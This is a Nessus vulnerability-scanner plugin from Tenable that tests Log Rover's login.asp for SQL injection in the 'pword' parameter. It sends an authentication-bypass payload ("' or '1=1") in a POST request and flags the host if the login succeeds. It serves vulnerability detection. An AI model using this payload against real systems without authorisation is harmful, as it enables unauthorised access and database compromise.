#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(40331);
  script_version("$Revision: 1.1 $");

  script_xref(name:"OSVDB", value:"55825");
  script_xref(name:"Secunia", value:"35821");

  script_name(english:"Log Rover pword Parameter SQL Injection");
  script_summary(english:"Tries to bypass authentication");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "The remote web server contains an ASP script that is prone to a SQL\n",
      "injection attack."
    )
  );
  script_set_attribute(
    attribute:"description", 
    value:string(
      "The remote host is running Log Rover, an ASP application for analyzing\n",
      "web server log files.\n",
      "\n",
      "The web interface included with the version of Log Rover installed on\n",
      "the remote host fails to sanitize user-supplied input to the 'pword'\n",
      "parameter of the 'login.asp' script before using it to construct\n",
      "database queries.  An unauthenticated attacker may be able to exploit\n",
      "this issue to manipulate database queries, leading to disclosure of\n",
      "sensitive information or attacks against the underlying database.\n",
      "\n",
      "Note that the 'uname' parameter is also likely to be similarly\n",
      "affected, although Nessus has not checked for that."
    )
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.securityfocus.com/archive/1/504869/30/0/threaded"
  );
  script_set_attribute(
    attribute:"solution", 
    value:"Unknown at this time."
  );
  script_set_attribute(
    attribute:"cvss_vector", 
    value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P"
  );
  script_set_attribute(
    attribute:"vuln_publication_date", 
    value:"2009/07/13"
  );
  script_set_attribute(
    attribute:"plugin_publication_date", 
    value:"2009/07/20"
  );
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!can_host_asp(port:port)) exit(0, "Web server does not support ASP scripts.");


user = SCRIPT_NAME;
pass = string(unixtime(), "' or '1=1");


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/logrover", "/logs", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Make sure the script exists.
  url = string(dir, "/login.asp");

  res = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(res)) exit(0, "The web server did not respond.");

  # If so...
  if (
    (
      'set our base logrover path' >< res[2] ||
      'Logrover puts you in touch' >< res[2]
    ) &&
    'input name="uname"' >< res[2] &&
    'input name="pword"' >< res[2]
  )
  {
    # Try to exploit the issue to bypass authentication.
    postdata = string(
      "uname=", user, "&",
      "pword=", urlencode(str:pass)
    );
    res = http_send_recv3(
      port        : port, 
      method      : 'POST', 
      item        : url, 
      data        : postdata, 
      add_headers : make_array(
        "Content-Type", "application/x-www-form-urlencoded"
      )
    );
    if (isnull(res)) exit(0, "The web server did not respond.");

    # There's a problem if we're logged in.
    if ("top.location = 'index1.asp'</script" >< res[2])
    {
      set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);

      if (report_verbosity > 0)
      {
        report = string(
          "\n",
          "Nessus was able to gain access using the following information :\n",
          "\n",
          "  URL      : ", build_url(port:port, qs:url), "\n",
          "  User     : ", user, "\n",
          "  Password : ", pass, "\n"
        );
        security_hole(port:port, extra:report);
      }
      else security_hole(port);

      exit(0);
    }
  }
}
exit(0, "The host is not affected.");
